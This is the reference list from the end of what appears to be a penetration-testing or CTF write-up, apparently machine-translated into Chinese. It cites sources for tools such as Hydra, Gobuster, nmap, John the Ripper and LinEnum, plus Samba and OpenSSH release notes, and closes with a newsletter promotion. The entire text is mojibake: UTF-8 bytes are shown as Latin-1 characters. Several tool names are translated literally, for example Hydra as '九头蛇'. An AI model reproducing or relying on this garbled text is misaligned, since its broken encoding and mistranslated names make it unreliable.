è‹±é›„ç»´åŸº(2022 å¹´ 6 æœˆ 15 æ—¥ä¿®è®¢)ã€‚æ¢…åˆ©èÂ·æ¯›ã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:ã€https://hero.fandom.com/wiki/Melissa_Mao?oldid=2662360 

Kali Linux å·¥å…·(æœªæ³¨æ˜)ã€‚*ä¹å¤´è›‡*ã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:[https://www.kali.org/tools/hydra/](https://www.kali.org/tools/hydra/)

Mehlmauer ç­‰äºº(æœªæ³¨æ˜)ã€‚ *Gobuster v3.2.0:ç”¨ Go* ç¼–å†™çš„ç›®å½•/æ–‡ä»¶ã€DNS å’Œ VHost ç ´åå·¥å…·ã€‚GitHub ä»“åº“ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)

ç±³å°”æ–¯å¦ç‰¹åŒº(2000 å¹´)ã€‚ *Apache JServ åè®® 1.3 ç‰ˆ*ã€‚é˜¿å¸•å¥‡åŸºé‡‘ä¼šã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://tomcat.apache.org/tomcat-3.3-doc/AJPv13.html](https://tomcat.apache.org/tomcat-3.3-doc/AJPv13.html)

nmap(æœªæ ‡æ˜)ã€‚ *Nmap:ç½‘ç»œæ˜ å°„å™¨â€”â€”å…è´¹å®‰å…¨æ‰«æå™¨*ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://nmap.org/](https://nmap.org/)

OpenSSH(7.2p 2 ç‰ˆ)ã€‚*å‘è¡Œè¯´æ˜*ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://www.openssh.com/txt/release-7.2p2](https://www.openssh.com/txt/release-7.2p2)

å¼€æ”¾å¼å¢™å£(æœªæ ‡æ˜)ã€‚å¼€è†›æ‰‹çº¦ç¿°å¯†ç ç ´è§£è€…ã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:[https://www.openwall.com/john/](https://www.openwall.com/john/)

â€œrebootuserâ€ç­‰(æœªæ³¨æ˜)ã€‚ *LinEnum:è„šæœ¬åŒ–çš„æœ¬åœ° Linux æšä¸¾&æƒé™æå‡æ£€æŸ¥*ã€‚GitHub ä»“åº“ã€‚2022 å¹´ 12 æœˆ 10 æ—¥æ£€ç´¢è‡ª:[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

æ¡‘å·´(2016)ã€‚*Samba 4 . 3 . 11 çš„å‘è¡Œè¯´æ˜*ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://www.samba.org/samba/history/samba-4.3.11.html](https://www.samba.org/samba/history/samba-4.3.11.html)

smbclient(æœªæ³¨æ˜)2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:[https://www . samba . org/samba/docs/current/man-html/SMB client . 1 . html](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

Ubuntu Linux(æœªæ ‡æ˜)ã€‚*Ubuntu çš„æ•…äº‹*ã€‚2022 å¹´ 12 æœˆ 9 æ—¥æ£€ç´¢è‡ª:ã€https://ubuntu.com/about 

xsltproc(æœªæ ‡æ˜)ã€‚ *xsltproc â€”å‘½ä»¤è¡Œ xslt å¤„ç†å™¨*ã€‚2022 å¹´ 12 æœˆ 7 æ—¥æ£€ç´¢è‡ª:[http://xmlsoft.org/xslt/xsltproc.html](http://xmlsoft.org/xslt/xsltproc.html)

## æ¥è‡ª Infosec çš„æŠ¥é“:Infosec æ¯å¤©éƒ½æœ‰å¾ˆå¤šå†…å®¹ï¼Œå¾ˆéš¾è·Ÿä¸Šã€‚[åŠ å…¥æˆ‘ä»¬çš„æ¯å‘¨ç®€è®¯](https://weekly.infosecwriteups.com/)ä»¥ 5 ç¯‡æ–‡ç« ã€4 ä¸ªçº¿ç¨‹ã€3 ä¸ªè§†é¢‘ã€2 ä¸ª GitHub Repos å’Œå·¥å…·ä»¥åŠ 1 ä¸ªå·¥ä½œæé†’çš„å½¢å¼å…è´¹è·å–æ‰€æœ‰æœ€æ–°çš„ Infosec è¶‹åŠ¿ï¼